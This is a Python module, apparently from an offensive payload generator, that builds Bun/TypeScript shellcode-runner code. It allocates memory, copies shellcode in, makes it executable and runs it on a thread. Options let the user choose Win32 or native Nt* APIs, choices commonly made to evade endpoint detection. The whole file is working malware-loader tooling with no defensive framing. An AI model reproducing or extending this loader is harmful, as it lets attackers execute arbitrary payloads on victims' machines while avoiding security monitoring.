from string import Template
import os
from common.utils.argumentparser import ArgumentParser

class shellcoderunner:
    def __init__(self, arguments):
        parser = ArgumentParser(modulename=self.__class__.__name__)
        parser.add_argument(name='allocate', default='VirtualAlloc', help='Function used for allocating memory', choices={'VirtualAlloc', 'HeapAlloc', 'NtAllocateVirtualMemory', 'VirtualAllocEx'})
        parser.add_argument(name='execute', default='CreateThread', help='Function used for executing shellcode', choices={'CreateThread', 'NtCreateThreadEx'})
        parser.add_argument(name='copy', default='memcpy', help='Function used for copying memory', choices={'memcpy', 'WriteProcessMemory', 'NtWriteVirtualMemory'})
        parser.add_argument(name='protect', default='VirtualProtect', help='Function used for changing memory protections', choices={'VirtualProtect', 'NtProtectVirtualMemory'})
        parser.add_argument(name='wait', default='WaitForSingleObject', help='Function used for waiting for execution to finish', choices={'WaitForSingleObject', 'NtWaitForSingleObject'})
        parser.add_argument(name='close', default='CloseHandle', help='Function used for closing handles after use', choices={'CloseHandle', 'NtClose'})
        parser.add_argument(name='perm', default='rx', help='Protection of memory when shellcode executes', choices={'rx': 'PAGE_EXECUTE_READ', 'rwx':'PAGE_EXECUTE_READWRITE'})
        self.args = parser.parse_args(arguments)   

    def imports(self) -> list[str]:
        return ['import Kernel32 from "@bun-win32/kernel32";', 
                'import { toArrayBuffer, ptr } from "bun:ffi";',
                'import { MemoryAllocationType, MemoryProtection, ThreadAccessRights, HeapAllocFlags } from "@bun-win32/kernel32";']

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:
        template = """
    {transformers}
"""

        if self.args['allocate'] == 'VirtualAlloc':
            template += """
    let address = {VirtualAlloc}(0, {shellcodeSize}, MemoryAllocationType.MEM_COMMIT | MemoryAllocationType.MEM_RESERVE, MemoryProtection.PAGE_READWRITE);
"""
        elif self.args['allocate'] == 'NtAllocateVirtualMemory':
            template += """
    let regionSize = new BigUint64Array(1);
    let baseAddress = new BigUint64Array(1);
    regionSize[0] = {shellcodeSize}n;
    let status = {NtAllocateVirtualMemory}(-1n, ptr(baseAddress), 0n, ptr(regionSize), MemoryAllocationType.MEM_COMMIT | MemoryAllocationType.MEM_RESERVE, MemoryProtection.PAGE_READWRITE);
    let address = baseAddress[0];
"""
        elif self.args['allocate'] == 'VirtualAllocEx':
            template += """
    let address = {VirtualAllocEx}(-1n, 0, {shellcodeSize}n, MemoryAllocationType.MEM_COMMIT | MemoryAllocationType.MEM_RESERVE, MemoryProtection.PAGE_READWRITE);
"""
        elif self.args['allocate'] == 'HeapAlloc':
            template += """
    let hHeap = {HeapCreate}(0, {shellcodeSize}, 0);
    let address = {HeapAlloc}(hHeap, HeapAllocFlags.HEAP_ZERO_MEMORY, {shellcodeSize});  
"""

        if self.args['copy'] == 'memcpy':
            template += """
    let buffer = new Uint8Array(toArrayBuffer(Number(address), 0, {shellcodeSize}));
    buffer.set(shellcode);
"""
        elif self.args['copy'] == 'WriteProcessMemory':
            template += """
    let bytesWritten = new BigUint64Array(1);
    {WriteProcessMemory}(-1n, address, ptr(shellcode), {shellcodeSize}n, bytesWritten);
"""
        elif self.args['copy'] == 'NtWriteVirtualMemory':
            template += """
    let bytesWritten = new BigUint64Array(1);
    {NtWriteVirtualMemory}(-1n, BigInt(address), ptr(shellcode), {shellcodeSize}n, ptr(bytesWritten));
"""

        if self.args['protect'] == 'VirtualProtect':
            template += Template("""
    let oldProtect = new Uint32Array(1);
    {VirtualProtect}(address, {shellcodeSize}n, MemoryProtection.$perm, oldProtect);
""").substitute(perm=self.args['perm'])
        elif self.args['protect'] == 'NtProtectVirtualMemory':
            template += Template("""
    let oldProtect = new Uint32Array(1);;
    let regionSize_$n = new BigUint64Array(1);
    regionSize_$n[0] = {shellcodeSize}n;
    let baseAddress_$n = new BigUint64Array([BigInt(address)]);
    {NtProtectVirtualMemory}(-1n, ptr(baseAddress_$n), ptr(regionSize_$n), MemoryProtection.$perm, ptr(oldProtect));
""").substitute(n=os.urandom(4).hex(), perm=self.args['perm'])

        if self.args['execute'] == 'CreateThread':
            template += """
    let hThread = {CreateThread}(null, 0n, address, null, 0, null);
"""
        elif self.args['execute'] == 'NtCreateThreadEx':
            template += """
    let hThreadBuffer = new BigUint64Array(1); 
    {NtCreateThreadEx}(ptr(hThreadBuffer), ThreadAccessRights.THREAD_ALL_ACCESS, null, -1n, address, 0n, 0, 0n, 0n, 0n, null);
    let hThread = hThreadBuffer[0];
"""
        elif self.args['execute'] == 'CreateRemoteThread':
            template += """
    let hThread = {CreateRemoteThread}(-1n, null, 0, address, 0, 0, null);
"""

        if self.args['wait'] == 'WaitForSingleObject':
            template += """
    {WaitForSingleObject}(hThread, 0xFFFFFFFF);
"""
        elif self.args['wait'] == 'NtWaitForSingleObject':
            template += """
    {NtWaitForSingleObject}(hThread, 0xFFFFFFFF);
"""

        if self.args['close'] == 'CloseHandle':
            template += """
    {CloseHandle}(hThread);
"""
        elif self.args['close'] == 'NtClose':
            template += """
    {NtClose}(hThread);
"""

        if self.args['allocate'] == 'VirtualAlloc':
            template += """
    {VirtualFree}(address, 0, MemoryAllocationType.MEM_RELEASE) ;
"""
        elif self.args['allocate'] == 'HeapAlloc':
            template += """
    {HeapFree}(hHeap, 0, address);
    {HeapDestroy}(hHeap);
"""
        elif self.args['allocate'] == 'NtAllocateVirtualMemory':
            template += """
    {NtFreeVirtualMemory}(-1n, address);
"""

        return template